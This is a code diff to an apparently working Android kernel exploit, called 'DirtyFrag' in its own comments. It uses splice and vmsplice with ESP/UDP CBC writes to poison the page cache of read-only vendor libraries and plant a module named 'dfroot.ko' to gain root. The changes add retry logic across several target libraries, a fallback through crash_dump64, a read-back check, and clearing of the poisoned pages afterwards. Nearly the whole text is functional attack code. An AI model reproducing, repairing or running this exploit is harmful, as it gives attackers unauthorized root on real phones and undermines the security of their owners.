@@ -113,45 +113,59 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
 
 /* Send one CBC write.
  * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
- * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
- * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
+ * source_helper=0: splice the file_fd page into the pipe (file is readable here)
+ * source_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
  * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
+ * A fresh pipe is created for every write so the gifted header page and the
+ * spliced file page can never alias a previous iteration's buffers.
  */
-static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
-                            const uint8_t iv[16], int use_helper) {
+static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
+                            const uint8_t iv[16], int source_helper) {
+    int ret = -1;
+    int pfd[2];
+    if (pipe(pfd) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
+    fcntl(pfd[1], F_SETPIPE_SZ, 65536);
+
     uint8_t hdr[24];
     *(uint32_t *)(hdr + 0) = htonl(g_spi);
     *(uint32_t *)(hdr + 4) = htonl(g_seq++);
     memcpy(hdr + 8, iv, 16);
 
     struct iovec iov = {.iov_base = hdr, .iov_len = 24};
-    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
-        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
+    if (vmsplice(pfd[1], &iov, 1, SPLICE_F_GIFT) != 24) {
+        printf("vmsplice hdr failed: %s\n", strerror(errno)); goto out_pipe;
     }
 
-    if (use_helper) {
-        int st = spawn_crash_dump(offset, pipe_wr, 1, NULL);
-        if (st < 0) return -1;
+    if (source_helper) {
+        int st = spawn_crash_dump(offset, pfd[1], 1, NULL);
+        if (st < 0) goto out_pipe;
         if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
             printf("splice helper failed status=0x%x\n", st);
-            return -1;
+            goto out_pipe;
         }
     } else {
         off_t off = offset;
-        if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
-            printf("splice file failed: %s\n", strerror(errno)); return -1;
+        if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
+            printf("splice file failed: %s\n", strerror(errno)); goto out_pipe;
         }
     }
 
-    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
-    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
-    return 0;
+    ssize_t s = splice(pfd[0], NULL, sk_send, NULL, 40, 0);
+    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); goto out_pipe; }
+    ret = 0;
+out_pipe:
+    close(pfd[0]); close(pfd[1]);
+    return ret;
 }
 
 /* Patch len bytes of payload into file starting at file offset foff.
  * Writes in 16-byte CBC blocks.
- * For system files (use_helper=0): reads old_content with pread().
- * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
+ * use_helper=0: system file, read old_content with pread().
+ * use_helper=1: vendor file, prefer a direct open()/pread()/splice() and fall back
+ *   to the crash_dump64 bridge when the file cannot be opened, or when its first
+ *   block cannot be read or written.
+ * Returns 0 on success, -1 on failure, and -2 when the first block failed before
+ * anything was written, so the caller may retry against another target.
  * len must be a multiple of 16.
  */
 static int patch_file_cbc(const char *path, const char *payload, size_t len,
@@ -183,35 +197,47 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     }
 
     int file_fd = -1;
-    if (!use_helper) {
-        file_fd = open(path, O_RDONLY);
+    int source_helper = use_helper;
+    int direct_tried = 0;
+    if (use_helper) {
+        /* Vendor libraries are normally readable by untrusted_app (apps load
+         * them), so prefer a direct open()+pread()+splice() over the
+         * crash_dump64 bridge. The bridge relies on an exec transition and a
+         * single page-cache alias that some vendor builds do not observe
+         * reliably; fall back to it only when the direct source fails. */
+        file_fd = open(path, O_RDONLY | O_CLOEXEC);
+        if (file_fd >= 0) {
+            source_helper = 0;
+            direct_tried = 1;
+            printf("vendor target readable directly; using direct file source\n");
+        }
+    }
+    if (!source_helper && file_fd < 0) {
+        file_fd = open(path, O_RDONLY | O_CLOEXEC);
         if (file_fd < 0) {
             printf("open %s failed: %s\n", path, strerror(errno));
             close(sk_send); return -1;
         }
     }
 
-    int pfd[2];
-    if (pipe(pfd) < 0) {
-        printf("pipe failed: %s\n", strerror(errno));
-        if (!use_helper) close(file_fd);
-        close(sk_send);
-        return -1;
-    }
-
     int rc = 0;
+cbc_retry:
     for (size_t i = 0; i < len / 16; i++) {
         off_t off = (off_t)(foff + i * 16);
         uint8_t old_content[16] = {0};
 
-        if (use_helper) {
+        if (source_helper) {
             if (read_vendor_content(off, old_content) < 0) {
-                rc = -1; break;
+                /* -2 means nothing was written yet, so either the caller or
+                 * the crash_dump64 fallback below may retry the whole patch. */
+                rc = (i == 0) ? -2 : -1;
+                break;
             }
         } else {
             if (pread(file_fd, old_content, 16, off) != 16) {
                 printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
-                rc = -1; break;
+                rc = (i == 0) ? -2 : -1;
+                break;
             }
         }
 
@@ -221,14 +247,28 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         uint8_t iv[16];
         compute_iv(old_content, desired, iv);
 
-        if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
+        if (do_one_write_cbc(sk_send, file_fd, off, iv, source_helper) < 0) {
             printf("write #%zu at 0x%lx failed\n", i, (long)off);
-            rc = -1; break;
+            rc = (i == 0) ? -2 : -1; break;
         }
     }
 
-    close(pfd[0]); close(pfd[1]);
-    if (!use_helper) close(file_fd);
+    /* The vendor target opened but its first block could not be read or
+     * written, so nothing has been written yet. Upstream always used the
+     * crash_dump64 bridge for vendor files, so fall back to it rather than
+     * fail where upstream would have succeeded. A later block failing means a
+     * partial write, which must not be retried. */
+    if (rc == -2 && direct_tried) {
+        printf("vendor target direct source unusable; retrying via crash_dump64\n");
+        close(file_fd);
+        file_fd = -1;
+        source_helper = 1;
+        direct_tried = 0;
+        rc = 0;
+        goto cbc_retry;
+    }
+
+    if (!source_helper) close(file_fd);
     close(sk_send);
     if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
     return rc;
@@ -359,6 +399,8 @@ static int patch_helper(void) {
     return 0;
 }
 
+static size_t build_ko_attempts(const char *out[], size_t max);
+
 static int patch_ko(void) {
     int andr = 0, major = 0, minor = 0;
     if (read_device_versions(&andr, &major, &minor) != 0) {
@@ -374,11 +416,60 @@ static int patch_ko(void) {
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
-    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
-    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
-    free(buf);
+
+    const char *attempts[4];
+    size_t n_attempts = build_ko_attempts(attempts, sizeof(attempts) / sizeof(attempts[0]));
+
+    int ret = -1;
+    for (size_t a = 0; a < n_attempts; a++) {
+        strncpy(libcxx_ko_target, attempts[a], 63);
+        libcxx_ko_target[63] = '\0';
+        printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
+        ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
+        if (ret != -2) break;
+        printf("patch: %s failed before writing; trying another vendor target\n",
+               libcxx_ko_target);
+    }
+
+    /* DirtyFrag can report successful writes that a later read does not
+     * observe. Read back a non-ELF interior block (offset 16 differs between
+     * ET_REL and ET_DYN) so a reverted page cache is reported instead of
+     * surfacing later as a silent timeout. */
+    if (ret == 0 && len >= 32) {
+        uint8_t back[16];
+        int vfd = open(libcxx_ko_target, O_RDONLY | O_CLOEXEC);
+        if (vfd >= 0) {
+            ssize_t n = pread(vfd, back, sizeof(back), 16);
+            if (n == (ssize_t)sizeof(back) && memcmp(back, buf + 16, sizeof(back)) != 0)
+                printf("patch: %s read-back mismatch (page cache may have reverted)\n",
+                       libcxx_ko_target);
+            else if (n == (ssize_t)sizeof(back))
+                printf("patch: %s verify OK\n", libcxx_ko_target);
+            close(vfd);
+        }
+    }
+
     if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
+    free(buf);
     return ret;
+}
+
+/* Invalidate the clean pages we poisoned so a later run (or a later exec)
+ * never observes a partially reverted page cache. */
+static void fadvise_drop(const char *path) {
+    int fd = open(path, O_RDONLY | O_CLOEXEC);
+    if (fd < 0) return;
+    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
+    close(fd);
+    printf("cache dropped: %s\n", path);
+}
+
+/* Repair the page caches we poisoned. Kept out of cleanup() on purpose: the
+ * libc++ restore may be skipped, but a reverted vendor page must never be left
+ * behind for a later exec. */
+static void invalidate_patched_pages(void) {
+    fadvise_drop(kCrashDump);
+    if (libcxx_ko_target) fadvise_drop(libcxx_ko_target);
 }
 
 static void cleanup(void) {
@@ -469,17 +560,33 @@ static int createOrphanProcess(void) {
     return 0;
 }
 
+static const char *const kKoCandidates[] = {
+    "/vendor/lib64/libbinderdebug.so",
+    "/vendor/lib64/libstagefrighthw.so",
+    "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+};
+
 static const char *detect_ko_target(void) {
-    static const char *const candidates[] = {
-        "/vendor/lib64/libbinderdebug.so",
-        "/vendor/lib64/libstagefrighthw.so",
-        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
-    };
-    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
-        if (access(candidates[i], F_OK) == 0)
-            return candidates[i];
+    for (size_t i = 0; i < sizeof(kKoCandidates) / sizeof(kKoCandidates[0]); i++) {
+        if (access(kKoCandidates[i], F_OK) == 0)
+            return kKoCandidates[i];
     }
-    return candidates[0];
+    return kKoCandidates[0];
+}
+
+/* Ordered vendor libraries to try for the KO: the detected primary first, then
+ * every other candidate that exists. Lets patch_ko() retry a target that could
+ * not be read before any byte was written. */
+static size_t build_ko_attempts(const char *out[], size_t max) {
+    size_t n = 0;
+    const char *first = detect_ko_target();
+    if (n < max) out[n++] = first;
+    for (size_t i = 0; i < sizeof(kKoCandidates) / sizeof(kKoCandidates[0]) && n < max; i++) {
+        if (strcmp(kKoCandidates[i], first) == 0) continue;
+        if (access(kKoCandidates[i], F_OK) != 0) continue;
+        out[n++] = kKoCandidates[i];
+    }
+    return n;
 }
 
 static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
@@ -588,6 +695,7 @@ static int exploit(void) {
     printf("timeout: ERROR - check logcat & dmesg\n");
 done:
     if (rc == 3) printf("patch: ERROR - failed to patch files\n");
+    invalidate_patched_pages();
     return rc;
 }
 
